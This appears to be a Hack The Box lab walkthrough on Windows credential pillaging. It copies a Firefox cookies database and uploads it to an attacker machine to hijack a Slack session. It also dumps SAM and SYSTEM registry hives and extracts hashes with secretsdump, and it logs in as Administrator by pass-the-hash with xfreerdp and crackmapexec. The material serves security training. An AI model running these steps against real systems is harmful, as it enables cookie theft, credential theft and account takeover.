 **Log in as Grace and find the cookies for the slacktestapp.com website. Use the cookie to log in into slacktestapp.com from a browser within the RDP session and submit the flag.**

```
xfreerdp /v:10.129.138.81 /u:Grace /p:Princess01! /cert:ignore
```


```powershell
# Copy Firefox Cookies Database
copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .
```

Now we use PSUpload.ps1 to download the file to our attacking machine. We set up the uploader server in our kali:

```
python -m uploadserver
```

And from the host target machine:

```
Invoke-FileUpload -Uri http://10.10.15.105:8000/upload -File c:\Users\Grace\Desktop\cookies.sqlite
```

Now that we have the file cookies.sqlite, we use the Python script [cookieextractor.py](https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/cookieextractor.py) to extract cookies from the Firefox cookies:

The script:

```python
#!/usr/bin/env python3
# Sample Script to extract cookies offile from FireFox sqlite database 
# Created by PlainText 

import argparse
import sqlite3

def main(dbpath, host, cookie):
	conn = sqlite3.connect(dbpath)
	cursor = conn.cursor()

	if (host == "" and cookie == ""):
		query = "SELECT * FROM moz_cookies"
	elif (host != "" and cookie == ""):
		query = "SELECT * FROM moz_cookies WHERE host LIKE '%{}%'".format(host)
	elif (host == "" and cookie != ""):
		query = "SELECT * FROM moz_cookies WHERE name LIKE '%{}%'".format(cookie)
	elif (host != "" and cookie != ""):
		query = "SELECT * FROM moz_cookies WHERE name LIKE '%{}%' AND host LIKE '%{}%'".format(cookie, host)

	cursor.execute(query)
	records = cursor.fetchall()
	rowCount = len(records) 

	if (rowCount > 0):
		for row in records:
			print(row)
	else:
		print("[-] No cookie found with the selected options.")

	conn.close()

if __name__ == "__main__":
	parser = argparse.ArgumentParser()
	parser.add_argument("--dbpath", "-d", required=True, help="The path to the sqlite cookies database")
	parser.add_argument("--host", "-o", required=False, help="The host for the cookie", default="")
	parser.add_argument("--cookie", "-c", required=False, help="The name of the cookie", default="")
	args = parser.parse_args()
	main(args.dbpath, args.host, args.cookie)
```

Basic usage:

```shell-session
python3 cookieextractor.py --dbpath "/home/plaintext/cookies.sqlite" --host slack --cookie d
```

Output:

```
(10, '', 'd', 'xoxd-VGhpcyBpcyBhIGNvb2tpZSB0byBzaW11bGF0ZSBhY2Nlc3MgdG8gU2xhY2ssIHN0ZWFsaW5nIGEgY29va2llIGZyb20gYSBicm93c2VyLg==', '.api.slacktestapp.com', '/', 7975292868, 1663945037085000, 1663945037085002, 0, 0, 0, 1, 0, 2)
```

Now that we have the cookie, we can use any browser extension to add the cookie to our browser. 

Go to slacktestapp.com, modify the cookie and you are in.

**Results**: HTB{Stealing_Cookies_To_AccessWebSites}


**Log in as Jeff via RDP and find the password for the restic backups. Submit the password as the answer.**

We know Jeff's credentials from previous exercise. They were exposed in the slack chat conversation.

```
xfreerdp /v:10.129.138.81 /u:jeff /p:Webmaster001! /cert:ignore
```

The backup password is in the Desktop, in file backup conf

**Results**: Superbackup!

**Restore the directory containing the files needed to obtain the password hashes for local users. Submit the Administrator hash as the answer.**

```
xfreerdp /v:10.129.138.81 /u:jeff /p:Webmaster001! /cert:ignore
```

We can  check which backups are saved in the repository using the `snapshot` command.

```powershell-session
restic.exe -r E:\restic\ snapshots
```

Output:

```
found 1 old cache directories in C:\Users\jeff\AppData\Local\restic, run `restic cache --cleanup` to remove them
ID        Time                 Host             Tags        Paths
--------------------------------------------------------------------------------------
02d25030  2022-08-09 05:58:15  PILLAGING-WIN01              C:\xampp\htdocs\webapp
24504d3d  2022-08-09 11:24:43  PILLAGING-WIN01              C:\Windows\System32\config
7b9cabc8  2022-08-09 11:25:47  PILLAGING-WIN01              C:\Windows\System32\config
4e7bd0cd  2022-08-09 11:55:33  PILLAGING-WIN01              C:\xampp\htdocs\webapp_old
b2f5caa0  2022-08-17 11:43:56  PILLAGING-WIN01              C:\Windows\System32\config
--------------------------------------------------------------------------------------
5 snapshots
```

We can restore a backup using the ID.

```powershell
restic.exe -r E:\restic\ restore 11dcaee2 --target C:\Restore
```

Also we could launch  CMD as an admin will allow us to run reg.exe to save copies of the registry hives.

```cmd
reg.exe save hklm\sam c:\Users\jeff\Desktop\sam.save reg.exe save hklm\system c:\Users\jeff\Desktop\system.save 
```

And copy it by using PSUpload.ps1 to our local machine. Once there:

```bash
python3 ~/tools/impacket/examples/secretsdump.py -sam sam.save  -system system.save LOCAL 

```

**Results**: bac9dc5b7b4bec1d83e0e9c04b477f26

Optional Exercises. Optional. Use the hash with a Pass-The-Hash technique to log in as the Administrator. Mark DONE when complete.

```
xfreerdp /v:10.129.138.81 /u:Administrator /pth:bac9dc5b7b4bec1d83e0e9c04b477f26 /cert:ignore

crackmapexec smb 10.129.138.81 -u Administrator -H bac9dc5b7b4bec1d83e0e9c04b477f26 --exec "cmd.exe"

```
